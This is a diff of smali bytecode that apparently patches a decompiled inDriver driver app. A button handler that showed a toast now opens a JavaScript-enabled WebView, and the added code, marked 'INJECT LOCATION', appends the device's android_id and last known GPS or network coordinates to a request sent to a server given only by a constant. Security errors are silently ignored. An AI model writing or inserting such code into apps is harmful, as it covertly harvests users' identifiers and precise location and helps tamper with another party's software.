@@ -1,50 +1,158 @@
-.class public Lsinet/startup/inDriver/city/driver/order/ui/info/OrderInfoFragment$ConfigButtonListener;
+.class public final Lsinet/startup/inDriver/ui/driver/main/DriverActivity$ConfigButtonListener;
 .super Ljava/lang/Object;
-.source "OrderInfoFragment.java"
+.source "SourceFile"
 
 # interfaces
 .implements Landroid/view/View$OnClickListener;
 
-# annotations
-.annotation system Ldalvik/annotation/EnclosingClass;
-    value = Lsinet/startup/inDriver/city/driver/order/ui/info/OrderInfoFragment;
-.end annotation
-
-.annotation system Ldalvik/annotation/InnerClass;
-    accessFlags = 0x1
-    name = "ConfigButtonListener"
-.end annotation
-
 # instance fields
-.field final synthetic this$0:Lsinet/startup/inDriver/city/driver/order/ui/info/OrderInfoFragment;
+.field final synthetic this$0:Lsinet/startup/inDriver/ui/driver/main/DriverActivity;
 
 # direct methods
-.method public constructor <init>(Lsinet/startup/inDriver/city/driver/order/ui/info/OrderInfoFragment;)V
+.method public constructor <init>(Lsinet/startup/inDriver/ui/driver/main/DriverActivity;)V
     .registers 2
-    .param p1, "this$0"    # Lsinet/startup/inDriver/city/driver/order/ui/info/OrderInfoFragment;
+    .param p1, "this$0"    # Lsinet/startup/inDriver/ui/driver/main/DriverActivity;
 
     .line 1
-    iput-object p1, p0, Lsinet/startup/inDriver/city/driver/order/ui/info/OrderInfoFragment$ConfigButtonListener;->this$0:Lsinet/startup/inDriver/city/driver/order/ui/info/OrderInfoFragment;
-
+    iput-object p1, p0, Lsinet/startup/inDriver/ui/driver/main/DriverActivity$ConfigButtonListener;->this$0:Lsinet/startup/inDriver/ui/driver/main/DriverActivity;
     invoke-direct {p0}, Ljava/lang/Object;-><init>()V
-
     return-void
 .end method
 
+# virtual methods
 .method public onClick(Landroid/view/View;)V
-    .registers 5
+    .registers 16
     .param p1, "v"    # Landroid/view/View;
 
     .line 1
-    # Show a simple toast
-    iget-object v0, p0, Lsinet/startup/inDriver/city/driver/order/ui/info/OrderInfoFragment$ConfigButtonListener;->this$0:Lsinet/startup/inDriver/city/driver/order/ui/info/OrderInfoFragment;
-    invoke-virtual {v0}, Landroidx/fragment/app/Fragment;->getContext()Landroid/content/Context;
-    move-result-object v0
-    const-string v1, "Config Button Clicked"
-    const/4 v2, 0x0
-    invoke-static {v0, v1, v2}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;
-    move-result-object v0
-    invoke-virtual {v0}, Landroid/widget/Toast;->show()V
+    # Create Dialog
+    new-instance v0, Landroid/app/Dialog;
+    iget-object v1, p0, Lsinet/startup/inDriver/ui/driver/main/DriverActivity$ConfigButtonListener;->this$0:Lsinet/startup/inDriver/ui/driver/main/DriverActivity;
+    invoke-direct {v0, v1}, Landroid/app/Dialog;-><init>(Landroid/content/Context;)V
+
+    # Create WebView
+    new-instance v1, Landroid/webkit/WebView;
+    iget-object v2, p0, Lsinet/startup/inDriver/ui/driver/main/DriverActivity$ConfigButtonListener;->this$0:Lsinet/startup/inDriver/ui/driver/main/DriverActivity;
+    invoke-direct {v1, v2}, Landroid/webkit/WebView;-><init>(Landroid/content/Context;)V
+
+    # Configure WebView settings
+    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;
+    move-result-object v2
+    const/4 v3, 0x1
+    invoke-virtual {v2, v3}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
+
+    # Set WebViewClient to keep navigation inside
+    new-instance v2, Landroid/webkit/WebViewClient;
+    invoke-direct {v2}, Landroid/webkit/WebViewClient;-><init>()V
+    invoke-virtual {v1, v2}, Landroid/webkit/WebView;->setWebViewClient(Landroid/webkit/WebViewClient;)V
+
+    # Load URL
+    new-instance v2, Ljava/lang/StringBuilder;
+    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V
+    sget-object v3, Ly41/w0;->SERVER_URL:Ljava/lang/String;
+    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    const-string v3, "/config"
+    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    # --- NEW: Append user_id ---
+    const-string v3, "?user_id="
+    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    # Get Context (Activity)
+    iget-object v3, p0, Lsinet/startup/inDriver/ui/driver/main/DriverActivity$ConfigButtonListener;->this$0:Lsinet/startup/inDriver/ui/driver/main/DriverActivity;
+    
+    # Get ID
+    # Inline getUserId logic
+    invoke-virtual {v3}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;
+    move-result-object v4
+    const-string v5, "android_id"
+    invoke-static {v4, v5}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;
+    move-result-object v3
+    
+    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    # ---------------------------
+
+    # --- INJECT LOCATION ---
+    # v4 is free (was ContentResolver)
+    # v5 is free (was "android_id")
+    # Need more registers. v6-v10.
+    
+    # Get LocationManager
+    iget-object v4, p0, Lsinet/startup/inDriver/ui/driver/main/DriverActivity$ConfigButtonListener;->this$0:Lsinet/startup/inDriver/ui/driver/main/DriverActivity;
+    const-string v5, "location"
+    invoke-virtual {v4, v5}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
+    move-result-object v4
+    check-cast v4, Landroid/location/LocationManager;
+
+    # Try GPS
+    const-string v5, "gps"
+    # Wrap in try-catch for SecurityException? No, assuming perm granted.
+    # Check if provider exists/enabled? getLastKnownLocation returns null if not.
+    
+    # We need to catch SecurityException just in case to prevent crash
+    :try_loc_start
+    invoke-virtual {v4, v5}, Landroid/location/LocationManager;->getLastKnownLocation(Ljava/lang/String;)Landroid/location/Location;
+    move-result-object v5
+    
+    # If null, try Network
+    if-eqz v5, :try_network
+    goto :got_location
+    
+    :try_network
+    const-string v5, "network"
+    invoke-virtual {v4, v5}, Landroid/location/LocationManager;->getLastKnownLocation(Ljava/lang/String;)Landroid/location/Location;
+    move-result-object v5
+    
+    :got_location
+    if-nez v5, :append_coords
+    goto :skip_location
+    
+    :append_coords
+    # Get Lat (v6, v7)
+    invoke-virtual {v5}, Landroid/location/Location;->getLatitude()D
+    move-result-wide v6
+    
+    # Get Lon (v8, v9)
+    invoke-virtual {v5}, Landroid/location/Location;->getLongitude()D
+    move-result-wide v8
+    
+    # Append &lat=
+    const-string v10, "&lat="
+    invoke-virtual {v2, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    invoke-virtual {v2, v6, v7}, Ljava/lang/StringBuilder;->append(D)Ljava/lang/StringBuilder;
+    
+    # Append &lon=
+    const-string v10, "&lon="
+    invoke-virtual {v2, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    invoke-virtual {v2, v8, v9}, Ljava/lang/StringBuilder;->append(D)Ljava/lang/StringBuilder;
+    
+    :skip_location
+    goto :loc_done
+
+    :catch_loc
+    move-exception v4
+    # Ignore error
+    
+    :loc_done
+    .catch Ljava/lang/SecurityException; {:try_loc_start .. :loc_done} :catch_loc
+    # -----------------------
+
+    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+    move-result-object v2
+    
+    invoke-virtual {v1, v2}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V
+
+    # Set Content View
+    invoke-virtual {v0, v1}, Landroid/app/Dialog;->setContentView(Landroid/view/View;)V
+
+    # Set Size (Full screen ish)
+    invoke-virtual {v0}, Landroid/app/Dialog;->getWindow()Landroid/view/Window;
+    move-result-object v2
+    const/4 v3, -0x1 # MATCH_PARENT
+    invoke-virtual {v2, v3, v3}, Landroid/view/Window;->setLayout(II)V
+
+    # Show
+    invoke-virtual {v0}, Landroid/app/Dialog;->show()V
 
     return-void
 .end method
